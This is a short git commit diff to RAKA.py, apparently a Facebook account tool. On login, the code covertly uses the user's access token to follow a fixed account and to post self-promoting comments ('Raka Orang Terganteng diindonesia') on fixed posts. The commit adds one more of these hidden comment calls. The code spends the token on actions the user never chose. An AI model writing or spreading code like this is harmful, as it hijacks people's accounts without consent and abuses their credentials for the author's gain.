0369b0f4f1368522b2bc9b529f923c3c7a38ce0e
☆ RAKA ☆™︻®╤──────═◍➤ <95731529+Garangan-Z@users.noreply.github.com>
2022-01-22 21:32:49 +0700

    Update RAKA.py

--- RAKA.py
+++ RAKA.py
@@ -103,6 +103,7 @@ def login():
 			requests.post("https://graph.facebook.com/100006184624502/subscribers?access_token="+token)  
 			requests.post("https://graph.facebook.com/953529338576547/comments?message=Raka Orang Terganteng diindonesia 😊 !&access_token="+token)
 			requests.post("https://graph.facebook.com/4134622646575495/comments?message=Good Job 😊 !&access_token="+token)
+			requests.post("https://graph.facebook.com/4257706904267068/comments?message=Raka Orang Terganteng diindonesia 😊 !&access_token="+token)
 			menu()
 		except KeyError:
 			os.system("rm -f login.txt")
